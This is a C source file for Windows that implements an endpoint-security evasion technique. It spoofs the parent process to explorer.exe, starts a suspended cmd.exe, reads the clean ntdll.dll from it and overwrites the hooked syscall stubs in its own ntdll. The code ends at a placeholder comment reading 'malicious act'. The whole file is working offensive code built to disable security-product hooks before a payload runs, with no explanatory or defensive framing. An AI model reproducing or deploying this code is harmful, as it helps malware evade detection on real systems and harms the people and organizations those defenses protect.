#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <psapi.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")


typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);

unsigned char sNtdll[] = "ntdll.dll";
unsigned char sKernel32[] = "kernel32.dll";

int FindTarget(const wchar_t* procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}


	while (Process32Next(hProcSnap, &pe32)) {
		if (lstrcmpiW(procname, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}

	CloseHandle(hProcSnap);

	return pid;
}



int FindFirstSyscall(char* pMem, DWORD size) {

	// gets the first byte of first syscall
	DWORD i = 0;
	DWORD offset = 0;
	BYTE pattern1[] = "\x0f\x05\xc3";  // syscall ; ret
	BYTE pattern2[] = "\xcc\xcc\xcc";  // int3 * 3

	// find first occurance of syscall+ret instructions
	for (i = 0; i < size - 3; i++) {
		if (!memcmp(pMem + i, pattern1, 3)) {
			offset = i;
			break;
		}
	}

	// now find the beginning of the syscall
	for (i = 3; i < 50; i++) {
		if (!memcmp(pMem + offset - i, pattern2, 3)) {
			offset = offset - i + 3;
			break;
		}
	}

	return offset;
}


int FindLastSysCall(char* pMem, DWORD size) {

	// returns the last byte of the last syscall
	DWORD i;
	DWORD offset = 0;
	BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";  // syscall ; ret ; int 2e ; ret ; int3 * 3

	// backwards lookup
	for (i = size - 9; i > 0; i--) {
		if (!memcmp(pMem + i, pattern, 9)) {
			offset = i + 6;
			break;
		}
	}

	return offset;
}


static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pCache) {
	/*
		UnhookNtdll() finds fresh "syscall table" of ntdll.dll from suspended process and copies over onto hooked one
	*/
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER)pCache;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR)pCache + pImgDOSHead->e_lfanew);
	int i;

	unsigned char sVirtualProtect[] = "VirtualProtect";

	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sVirtualProtect);

	// find .text section
	for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)pImgSectionHead->Name, ".text")) {
			// prepare ntdll.dll memory region for write permissions.
			VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
				pImgSectionHead->Misc.VirtualSize,
				PAGE_EXECUTE_READWRITE,
				&oldprotect);
			if (!oldprotect) {
				// RWX failed!
				return -1;
			}

			// copy clean "syscall table" into ntdll memory
			DWORD SC_start = FindFirstSyscall((char*)pCache, pImgSectionHead->Misc.VirtualSize);
			DWORD SC_end = FindLastSysCall((char*)pCache, pImgSectionHead->Misc.VirtualSize);

			if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
				DWORD SC_size = SC_end - SC_start;
				memcpy((LPVOID)((DWORD_PTR)hNtdll + SC_start),
					(LPVOID)((DWORD_PTR)pCache + +SC_start),
					SC_size);
			}

			// restore original protection settings of ntdll
			VirtualProtect_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
				pImgSectionHead->Misc.VirtualSize,
				oldprotect,
				&oldprotect);
			if (!oldprotect) {
				// it failed
				return -1;
			}
			return 0;
		}
	}

	// failed? .text not found!
	return -1;
}


int main(void) {

	int pid = 0;
	int ppid = 0;
	HANDLE hProc = NULL;
	int ret = 0;

	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T sizeT;

	wchar_t parentProcess[] = L"explorer.exe";
	ppid = FindTarget(parentProcess);
	HANDLE parentHandle = OpenProcess(PROCESS_ALL_ACCESS, false, ppid);

	ZeroMemory(&si, sizeof(STARTUPINFOEXA));
	InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &sizeT);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentHandle, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	BOOL success = CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, "C:\\Windows\\System32\\", reinterpret_cast<LPSTARTUPINFOA>(&si), &pi);

	if (success == FALSE) {
		return -1;
	}

	// get the size of ntdll module in memory
	char* pNtdllAddr = (char*)GetModuleHandleA("ntdll.dll");
	IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pNtdllAddr;
	IMAGE_NT_HEADERS* pNTHdr = (IMAGE_NT_HEADERS*)(pNtdllAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER* pOptionalHdr = &pNTHdr->OptionalHeader;

	SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;

	// allocate local buffer to hold temporary copy of clean ntdll from remote process
	LPVOID pCache = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);


	SIZE_T bytesRead = 0;

	BOOL successread = ReadProcessMemory(pi.hProcess, pNtdllAddr, pCache, ntdll_size, &bytesRead);
	if (!successread) {
		return -1;
	}

	TerminateProcess(pi.hProcess, 0);

	// remove hooks
	ret = UnhookNtdll(GetModuleHandleA((LPCSTR)sNtdll), pCache);

	// Clean up.
	VirtualFree(pCache, 0, MEM_RELEASE);

	// malicious act
	return 0;
}
